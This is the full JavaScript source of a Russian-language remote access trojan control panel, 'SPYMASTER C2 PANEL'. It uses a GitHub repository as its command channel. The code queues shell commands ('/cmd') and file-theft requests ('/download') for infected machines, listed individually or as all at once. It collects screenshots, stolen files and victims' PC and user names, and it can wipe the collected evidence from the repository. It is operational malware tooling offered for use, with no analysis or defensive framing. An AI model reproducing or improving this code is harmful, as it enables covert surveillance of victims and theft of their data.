// ============= SPYMASTER C2 PANEL - ПОЛНЫЙ SCRIPT.JS =============
// АВТОР: КРЫСА ГУБЕРНАТОРСКАЯ

// ============= КОНФИГУРАЦИЯ (С ПОДДЕРЖКОЙ ЛОКАЛЬНОГО CONFIG) =============
let GITHUB_USERNAME = "твой_логин";
let GITHUB_REPO = "rat_c2";
let GITHUB_TOKEN = "";

// Пытаемся загрузить локальный config (если есть)
try {
    if (typeof CONFIG !== 'undefined') {
        GITHUB_USERNAME = CONFIG.GITHUB_USERNAME || GITHUB_USERNAME;
        GITHUB_TOKEN = CONFIG.GITHUB_TOKEN || "";
        console.log("✅ Загружена локальная конфигурация");
    }
} catch(e) {}

// Если нет токена - запрашиваем
if (!GITHUB_TOKEN) {
    const savedToken = localStorage.getItem("github_token");
    if (savedToken) {
        GITHUB_TOKEN = savedToken;
        console.log("✅ Токен загружен из localStorage");
    } else {
        GITHUB_TOKEN = prompt("🔐 ВВЕДИТЕ ТОКЕН GITHUB ДЛЯ ДОСТУПА К C2 ПАНЕЛИ:\n(Токен начинается с ghp_)");
        if (GITHUB_TOKEN && GITHUB_TOKEN.startsWith("ghp_")) {
            localStorage.setItem("github_token", GITHUB_TOKEN);
            console.log("✅ Токен сохранён в localStorage");
        } else if (GITHUB_TOKEN) {
            alert("❌ НЕВЕРНЫЙ ТОКЕН! Токен должен начинаться с 'ghp_'");
        }
    }
}

// Сохраняем логин
if (GITHUB_USERNAME === "твой_логин") {
    const savedUser = localStorage.getItem("github_username");
    if (savedUser) {
        GITHUB_USERNAME = savedUser;
        console.log("✅ Логин загружен из localStorage");
    } else {
        GITHUB_USERNAME = prompt("👤 ВВЕДИТЕ ВАШ LOGIN GITHUB:");
        if (GITHUB_USERNAME) {
            localStorage.setItem("github_username", GITHUB_USERNAME);
            console.log("✅ Логин сохранён в localStorage");
        }
    }
}

// ============= ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ =============
const API_URL = `https://api.github.com/repos/${GITHUB_USERNAME}/${GITHUB_REPO}/contents`;
const HEADERS = {
    "Authorization": `token ${GITHUB_TOKEN}`,
    "Accept": "application/vnd.github.v3+json"
};

let clients = [];
let seenFiles = [];
let autoRefresh = null;
let currentClient = "all";

// ============= ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =============
function addLog(message, type = "system") {
    const logContainer = document.getElementById("logContainer");
    const time = new Date().toLocaleTimeString();
    const logEntry = document.createElement("div");
    logEntry.className = `log-entry ${type}`;
    logEntry.innerHTML = `<span style="color:#666">[${time}]</span> ${message}`;
    logContainer.insertBefore(logEntry, logContainer.firstChild);
    
    // Ограничиваем количество логов (не более 300)
    while (logContainer.children.length > 300) {
        logContainer.removeChild(logContainer.lastChild);
    }
}

function showNotification(message, type = "info") {
    // Создаём временное уведомление
    const notification = document.createElement("div");
    notification.style.cssText = `
        position: fixed;
        bottom: 20px;
        right: 20px;
        background: ${type === "success" ? "#00aa00" : type === "error" ? "#aa0000" : "#1a1f4e"};
        color: #fff;
        padding: 10px 20px;
        border-radius: 5px;
        font-family: monospace;
        font-size: 12px;
        z-index: 1000;
        animation: fadeInOut 3s ease;
    `;
    notification.innerText = message;
    document.body.appendChild(notification);
    setTimeout(() => notification.remove(), 3000);
}

async function githubRequest(url, method = "GET", data = null) {
    if (!GITHUB_TOKEN) {
        addLog("❌ ТОКЕН НЕ ЗАДАН! Обновите страницу и введите токен", "error");
        return null;
    }
    
    try {
        const options = {
            method: method,
            headers: HEADERS
        };
        
        if (data && (method === "PUT" || method === "DELETE")) {
            options.body = JSON.stringify(data);
        }
        
        const response = await fetch(url, options);
        
        if (response.status === 401) {
            addLog("❌ ОШИБКА АВТОРИЗАЦИИ! Токен неверный или истёк", "error");
            document.getElementById("statusIndicator").classList.remove("online");
            document.getElementById("statusText").innerHTML = "❌ ОШИБКА: НЕВЕРНЫЙ ТОКЕН";
            localStorage.removeItem("github_token");
            setTimeout(() => {
                if (confirm("Токен не работает. Хотите ввести новый?")) {
                    location.reload();
                }
            }, 1000);
            return null;
        }
        
        if (response.status === 404 && method !== "PUT") {
            return null;
        }
        
        if (response.status === 403) {
            const resetTime = response.headers.get("X-RateLimit-Reset");
            if (resetTime) {
                const waitTime = Math.ceil((parseInt(resetTime) * 1000 - Date.now()) / 1000);
                addLog(`⚠️ ЛИМИТ ЗАПРОСОВ GITHUB! Подождите ${waitTime} секунд`, "error");
            } else {
                addLog("⚠️ ЛИМИТ ЗАПРОСОВ GITHUB! Подождите немного", "error");
            }
            return null;
        }
        
        if (response.status === 409) {
            // Конфликт - игнорируем, просто подождём
            return null;
        }
        
        return await response.json();
    } catch (error) {
        addLog(`❌ Ошибка GitHub API: ${error.message}`, "error");
        return null;
    }
}

// ============= ОТПРАВКА КОМАНД =============
async function sendCommand(command, clientId = null) {
    if (!command) return;
    
    const targetClient = clientId || currentClient || "all";
    addLog(`📨 ОТПРАВКА: ${command} ${targetClient !== "all" ? `(Клиент: ${targetClient})` : "(ВСЕМ)"}`, "success");
    
    try {
        let finalCommand = command;
        if (targetClient !== "all") {
            finalCommand = `@${targetClient} ${command}`;
        }
        
        // Получаем текущий commands.txt
        let url = `${API_URL}/commands.txt`;
        let response = await githubRequest(url);
        
        let currentContent = "";
        let sha = null;
        
        if (response && response.content) {
            currentContent = atob(response.content);
            sha = response.sha;
        }
        
        const newContent = currentContent + finalCommand + "\n";
        const encodedContent = btoa(unescape(encodeURIComponent(newContent)));
        
        const putData = {
            message: `Command: ${command}`,
            content: encodedContent,
            branch: "main"
        };
        if (sha) putData.sha = sha;
        
        await githubRequest(url, "PUT", putData);
        addLog(`✅ КОМАНДА ОТПРАВЛЕНА: ${command}`, "success");
        showNotification(`Команда отправлена: ${command}`, "success");
        
    } catch (error) {
        addLog(`❌ Ошибка отправки: ${error.message}`, "error");
        showNotification(`Ошибка отправки: ${command}`, "error");
    }
}

// ============= ОЧИСТКА КОМАНД =============
async function clearCommands() {
    try {
        const url = `${API_URL}/commands.txt`;
        const response = await githubRequest(url);
        
        if (response && response.sha) {
            const putData = {
                message: "Clear commands",
                content: btoa(""),
                sha: response.sha,
                branch: "main"
            };
            await githubRequest(url, "PUT", putData);
            addLog("🗑 КОМАНДЫ ОЧИЩЕНЫ", "success");
            showNotification("Очередь команд очищена", "success");
        }
    } catch (error) {
        addLog(`❌ Ошибка очистки: ${error.message}`, "error");
    }
}

// ============= ОЧИСТКА ВСЕХ ДАННЫХ (КРОМЕ ФАЙЛОВ САЙТА) =============
async function clearAllFiles() {
    if (!confirm("💣 ВНИМАНИЕ! Это удалит ВСЕ результаты, скриншоты и файлы из репозитория.\n\nФайлы сайта (index.html, style.css, script.js) НЕ будут затронуты.\n\nПродолжить?")) return;
    
    addLog("💣 НАЧАЛО ОЧИСТКИ РЕПОЗИТОРИЯ...", "system");
    
    try {
        const response = await githubRequest(API_URL);
        if (response && Array.isArray(response)) {
            let deleted = 0;
            let skipped = 0;
            
            // Защищённые файлы (НЕ УДАЛЯЕМ)
            const protectedFiles = ["index.html", "style.css", "script.js", "config.js", ".gitignore"];
            
            for (const file of response) {
                if (protectedFiles.includes(file.name)) {
                    skipped++;
                    continue;
                }
                
                const deleteData = {
                    message: `Delete ${file.name}`,
                    sha: file.sha,
                    branch: "main"
                };
                await githubRequest(`${API_URL}/${file.name}`, "DELETE", deleteData);
                deleted++;
                
                // Небольшая задержка чтобы не превысить лимиты
                await new Promise(r => setTimeout(r, 100));
            }
            
            addLog(`💣 УДАЛЕНО ФАЙЛОВ: ${deleted}`, "success");
            if (skipped > 0) addLog(`🛡️ ПРОПУЩЕНО (защищённые): ${skipped}`, "system");
            showNotification(`Удалено ${deleted} файлов`, "success");
            
            // Очищаем кэш
            seenFiles = [];
            clients = [];
            loadResults();
        }
    } catch (error) {
        addLog(`❌ Ошибка очистки: ${error.message}`, "error");
    }
}

// ============= ЗАГРУЗКА РЕЗУЛЬТАТОВ =============
async function loadResults() {
    try {
        const response = await githubRequest(API_URL);
        if (!response || !Array.isArray(response)) return;
        
        const results = response.filter(f => f.name.startsWith("result_"));
        const screenshots = response.filter(f => f.name.startsWith("screenshot_"));
        const files = response.filter(f => f.name.startsWith("file_"));
        
        // Обновляем статистику
        document.getElementById("resultsCount").innerText = results.length;
        document.getElementById("screensCount").innerText = screenshots.length;
        document.getElementById("clientsCount").innerText = clients.length;
        
        // Обрабатываем новые результаты
        for (const file of [...results, ...screenshots, ...files]) {
            if (!seenFiles.includes(file.name)) {
                seenFiles.push(file.name);
                
                if (file.name.startsWith("result_")) {
                    try {
                        const content = await fetch(file.download_url).then(r => r.text());
                        addLog(`📥 НОВЫЙ РЕЗУЛЬТАТ: ${file.name}`, "result");
                        // Показываем первые 10 строк результата
                        const lines = content.split('\n').slice(0, 10);
                        for (const line of lines) {
                            if (line.trim()) addLog(`   ${line}`, "result");
                        }
                        parseClientInfo(content);
                    } catch(e) {
                        addLog(`⚠️ Не удалось прочитать ${file.name}`, "error");
                    }
                }
                
                if (file.name.startsWith("screenshot_")) {
                    addLog(`📸 НОВЫЙ СКРИНШОТ: ${file.name}`, "success");
                    updateScreensGrid();
                }
                
                if (file.name.startsWith("file_")) {
                    addLog(`📁 НОВЫЙ ФАЙЛ: ${file.name}`, "success");
                    updateFilesList();
                }
            }
        }
        
        updateClientsList();
        updateScreensGrid();
        updateFilesList();
        
    } catch (error) {
        addLog(`❌ Ошибка загрузки: ${error.message}`, "error");
    }
}

// ============= ПАРСИНГ ИНФОРМАЦИИ О КЛИЕНТАХ =============
function parseClientInfo(content) {
    if (content.includes("[Connected]") || content.includes("PC:")) {
        const pcMatch = content.match(/PC:\s*([^\n]+)/);
        const userMatch = content.match(/User:\s*([^\n]+)/);
        const timeMatch = content.match(/Time:\s*([^\n]+)/);
        
        if (pcMatch) {
            const clientId = pcMatch[1].trim();
            if (!clients.find(c => c.id === clientId)) {
                clients.push({
                    id: clientId,
                    user: userMatch ? userMatch[1].trim() : "Unknown",
                    time: timeMatch ? timeMatch[1].trim() : new Date().toLocaleString(),
                    firstSeen: new Date().toLocaleString()
                });
                addLog(`💻 НОВЫЙ КЛИЕНТ ПОДКЛЮЧИЛСЯ: ${clientId}`, "client");
                showNotification(`Новый клиент: ${clientId}`, "success");
                updateClientsList();
            }
        }
    }
}

// ============= ОБНОВЛЕНИЕ СПИСКА КЛИЕНТОВ =============
function updateClientsList() {
    const select = document.getElementById("clientSelect");
    const clientsDiv = document.getElementById("clientsList");
    
    // Обновляем селект
    select.innerHTML = '<option value="all">📱 ВСЕ КЛИЕНТЫ</option>';
    
    if (clients.length === 0) {
        clientsDiv.innerHTML = '<div class="empty-message">💤 Нет подключенных клиентов</div>';
        return;
    }
    
    clientsDiv.innerHTML = "";
    
    for (const client of clients) {
        select.innerHTML += `<option value="${client.id}">🖥️ ${client.id}</option>`;
        
        const clientCard = document.createElement("div");
        clientCard.className = "client-card";
        clientCard.setAttribute("data-client", client.id);
        clientCard.onclick = () => {
            document.querySelectorAll(".client-card").forEach(c => c.classList.remove("selected"));
            clientCard.classList.add("selected");
            document.getElementById("clientSelect").value = client.id;
            currentClient = client.id;
            addLog(`🎯 ВЫБРАН КЛИЕНТ: ${client.id}`, "success");
            showNotification(`Выбран клиент: ${client.id}`, "info");
        };
        
        clientCard.innerHTML = `
            <div class="client-name">🖥️ ${escapeHtml(client.id)}</div>
            <div class="client-info">👤 ${escapeHtml(client.user)}</div>
            <div class="client-time">🕐 Подключен: ${escapeHtml(client.firstSeen)}</div>
        `;
        clientsDiv.appendChild(clientCard);
    }
}

// ============= ОБНОВЛЕНИЕ СЕТКИ СКРИНШОТОВ =============
async function updateScreensGrid() {
    const response = await githubRequest(API_URL);
    if (!response || !Array.isArray(response)) return;
    
    const screenshots = response.filter(f => f.name.startsWith("screenshot_")).reverse();
    const grid = document.getElementById("screensGrid");
    
    if (screenshots.length === 0) {
        grid.innerHTML = '<div class="empty-message">📭 Нет скриншотов</div>';
        return;
    }
    
    grid.innerHTML = "";
    
    for (const screenshot of screenshots) {
        const card = document.createElement("div");
        card.className = "screenshot-card";
        card.onclick = () => showModal(screenshot.download_url, screenshot.name);
        
        card.innerHTML = `
            <img src="${screenshot.download_url}" alt="${screenshot.name}" 
                 onerror="this.src='data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' width=\'200\' height=\'150\'%3E%3Crect width=\'200\' height=\'150\' fill=\'%230a0e27\'/%3E%3Ctext x=\'100\' y=\'75\' fill=\'%2300ff41\' text-anchor=\'middle\'%3E📸 ${screenshot.name}%3C/text%3E%3C/svg%3E'">
            <div class="info">📸 ${screenshot.name}</div>
        `;
        grid.appendChild(card);
    }
}

// ============= ОБНОВЛЕНИЕ СПИСКА ФАЙЛОВ =============
async function updateFilesList() {
    const response = await githubRequest(API_URL);
    if (!response || !Array.isArray(response)) return;
    
    const files = response.filter(f => f.name.startsWith("file_")).reverse();
    const list = document.getElementById("filesList");
    
    if (files.length === 0) {
        list.innerHTML = '<div class="empty-message">📭 Нет загруженных файлов</div>';
        return;
    }
    
    list.innerHTML = "";
    
    for (const file of files) {
        const item = document.createElement("div");
        item.className = "file-item";
        
        const fileSize = file.size ? formatFileSize(file.size) : "?";
        
        item.innerHTML = `
            <span class="file-name">📄 ${escapeHtml(file.name)} (${fileSize})</span>
            <button class="file-download" onclick="window.open('${file.download_url}', '_blank')">⬇️ СКАЧАТЬ</button>
        `;
        list.appendChild(item);
    }
}

// ============= ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =============
function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

function formatFileSize(bytes) {
    if (bytes < 1024) return bytes + " B";
    if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + " KB";
    return (bytes / (1024 * 1024)).toFixed(1) + " MB";
}

// ============= МОДАЛЬНОЕ ОКНО =============
function showModal(imageUrl, title) {
    let modal = document.getElementById("imageModal");
    if (!modal) {
        modal = document.createElement("div");
        modal.id = "imageModal";
        modal.className = "modal";
        modal.innerHTML = `
            <span class="modal-close">&times;</span>
            <div class="modal-content">
                <div class="modal-title"></div>
                <img src="" alt="Screenshot">
            </div>
        `;
        document.body.appendChild(modal);
        
        modal.querySelector(".modal-close").onclick = () => {
            modal.classList.remove("active");
        };
        modal.onclick = (e) => {
            if (e.target === modal) modal.classList.remove("active");
        };
    }
    
    modal.querySelector("img").src = imageUrl;
    modal.querySelector(".modal-title").innerHTML = title || "Скриншот";
    modal.classList.add("active");
}

// ============= ПРОВЕРКА ПОДКЛЮЧЕНИЯ =============
async function testConnection() {
    const indicator = document.getElementById("statusIndicator");
    const statusText = document.getElementById("statusText");
    
    addLog("🔌 ПРОВЕРКА ПОДКЛЮЧЕНИЯ К GITHUB...", "system");
    
    if (!GITHUB_TOKEN) {
        indicator.classList.remove("online");
        statusText.innerHTML = "❌ ТОКЕН НЕ ЗАДАН";
        addLog("❌ ТОКЕН НЕ ЗАДАН! Обновите страницу", "error");
        return false;
    }
    
    try {
        const response = await fetch("https://api.github.com/user", { headers: HEADERS });
        
        if (response.ok) {
            const user = await response.json();
            indicator.classList.add("online");
            statusText.innerHTML = `✅ ПОДКЛЮЧЕН | ПОЛЬЗОВАТЕЛЬ: ${user.login} | РЕПО: ${GITHUB_REPO}`;
            addLog(`✅ ПОДКЛЮЧЕНИЕ УСПЕШНО! ПОЛЬЗОВАТЕЛЬ: ${user.login}`, "success");
            return true;
        } else if (response.status === 401) {
            indicator.classList.remove("online");
            statusText.innerHTML = "❌ ОШИБКА: НЕВЕРНЫЙ ТОКЕН";
            addLog("❌ ОШИБКА АВТОРИЗАЦИИ! Проверьте токен", "error");
            localStorage.removeItem("github_token");
            return false;
        } else {
            indicator.classList.remove("online");
            statusText.innerHTML = `❌ ОШИБКА: ${response.status}`;
            addLog(`❌ ОШИБКА: ${response.status}`, "error");
            return false;
        }
    } catch (error) {
        indicator.classList.remove("online");
        statusText.innerHTML = "❌ ОШИБКА ПОДКЛЮЧЕНИЯ";
        addLog(`❌ НЕ УДАЛОСЬ ПОДКЛЮЧИТЬСЯ: ${error.message}`, "error");
        return false;
    }
}

// ============= ЗАПУСК АВТООБНОВЛЕНИЯ =============
function startAutoRefresh() {
    if (autoRefresh) clearInterval(autoRefresh);
    autoRefresh = setInterval(() => {
        loadResults();
    }, 5000);
    addLog("🔄 АВТООБНОВЛЕНИЕ ЗАПУЩЕНО (интервал 5 сек)", "system");
}

// ============= ЭКСПОРТ ГЛОБАЛЬНЫХ ФУНКЦИЙ =============
window.sendCommand = sendCommand;
window.clearCommands = clearCommands;
window.clearAllFiles = clearAllFiles;
window.testConnection = testConnection;

// ============= ИНИЦИАЛИЗАЦИЯ =============
async function init() {
    addLog("🐀 SPYMASTER C2 PANEL v4.0 ЗАПУЩЕН", "system");
    addLog("🐀 АВТОР: КРЫСА ГУБЕРНАТОРСКАЯ", "system");
    addLog(`📁 РЕПОЗИТОРИЙ: ${GITHUB_USERNAME}/${GITHUB_REPO}`, "system");
    
    if (!GITHUB_TOKEN) {
        addLog("❌ ТОКЕН НЕ НАЙДЕН! Обновите страницу и введите токен", "error");
        document.getElementById("statusIndicator").classList.remove("online");
        document.getElementById("statusText").innerHTML = "❌ ТРЕБУЕТСЯ ТОКЕН";
        return;
    }
    
    const connected = await testConnection();
    if (connected) {
        startAutoRefresh();
        await loadResults();
    }
    
    // Привязываем обработчики
    document.querySelectorAll(".cmd-btn").forEach(btn => {
        btn.addEventListener("click", () => {
            const cmd = btn.getAttribute("data-cmd");
            if (cmd) sendCommand(cmd);
        });
    });
    
    document.querySelectorAll(".cmd-small").forEach(btn => {
        if (!btn.id) {
            btn.addEventListener("click", () => {
                const cmd = btn.getAttribute("data-cmd");
                if (cmd) sendCommand(cmd);
            });
        }
    });
    
    // Кнопка отправки кастомной команды
    const sendCustomBtn = document.getElementById("sendCustomBtn");
    if (sendCustomBtn) {
        sendCustomBtn.addEventListener("click", () => {
            const cmd = document.getElementById("customCmd").value;
            if (cmd) {
                sendCommand(cmd);
                document.getElementById("customCmd").value = "";
            }
        });
    }
    
    // Enter в поле кастомной команды
    const customCmd = document.getElementById("customCmd");
    if (customCmd) {
        customCmd.addEventListener("keypress", (e) => {
            if (e.key === "Enter") {
                const cmd = customCmd.value;
                if (cmd) {
                    sendCommand(cmd);
                    customCmd.value = "";
                }
            }
        });
    }
    
    // Кнопка скачивания файла
    const downloadBtn = document.getElementById("downloadBtn");
    if (downloadBtn) {
        downloadBtn.addEventListener("click", () => {
            const path = document.getElementById("downloadPath").value;
            if (path) sendCommand(`/download ${path}`);
        });
    }
    
    // Кнопка выполнения shell команды
    const shellBtn = document.getElementById("shellBtn");
    if (shellBtn) {
        shellBtn.addEventListener("click", () => {
            const cmd = document.getElementById("shellCmd").value;
            if (cmd) sendCommand(`/cmd ${cmd}`);
        });
    }
    
    // Кнопки управления
    const clearCommandsBtn = document.getElementById("clearCommandsBtn");
    if (clearCommandsBtn) clearCommandsBtn.addEventListener("click", clearCommands);
    
    const clearAllBtn = document.getElementById("clearAllBtn");
    if (clearAllBtn) clearAllBtn.addEventListener("click", clearAllFiles);
    
    const refreshBtn = document.getElementById("refreshBtn");
    if (refreshBtn) {
        refreshBtn.addEventListener("click", () => {
            loadResults();
            addLog("🔄 РУЧНОЕ ОБНОВЛЕНИЕ", "system");
            showNotification("Данные обновлены", "info");
        });
    }
    
    // Выбор клиента
    const clientSelect = document.getElementById("clientSelect");
    if (clientSelect) {
        clientSelect.addEventListener("change", () => {
            currentClient = clientSelect.value;
            if (currentClient !== "all") {
                addLog(`🎯 ВЫБРАН КЛИЕНТ: ${currentClient}`, "success");
            } else {
                addLog(`📱 ВЫБРАНЫ ВСЕ КЛИЕНТЫ`, "system");
            }
        });
    }
    
    // Вкладки
    document.querySelectorAll(".tab-btn").forEach(btn => {
        btn.addEventListener("click", () => {
            document.querySelectorAll(".tab-btn").forEach(b => b.classList.remove("active"));
            document.querySelectorAll(".tab-content").forEach(t => t.classList.remove("active"));
            btn.classList.add("active");
            const tabId = `${btn.getAttribute("data-tab")}Tab`;
            const tabContent = document.getElementById(tabId);
            if (tabContent) tabContent.classList.add("active");
        });
    });
    
    // Добавляем стиль для анимации уведомлений
    const style = document.createElement('style');
    style.textContent = `
        @keyframes fadeInOut {
            0% { opacity: 0; transform: translateX(20px); }
            15% { opacity: 1; transform: translateX(0); }
            85% { opacity: 1; transform: translateX(0); }
            100% { opacity: 0; transform: translateX(20px); }
        }
        
        .modal.active {
            display: flex !important;
        }
        
        .modal-content {
            position: relative;
            max-width: 90%;
            max-height: 90%;
        }
        
        .modal-title {
            color: #00ff41;
            font-family: monospace;
            padding: 10px;
            text-align: center;
            background: #0a0e27;
            border-top: 1px solid #00ff41;
            border-left: 1px solid #00ff41;
            border-right: 1px solid #00ff41;
            border-radius: 8px 8px 0 0;
        }
        
        .modal img {
            max-width: 100%;
            max-height: calc(90vh - 50px);
            border: 1px solid #00ff41;
            border-radius: 0 0 8px 8px;
        }
    `;
    document.head.appendChild(style);
}

// Запуск после загрузки DOM
if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init);
} else {
    init();
}
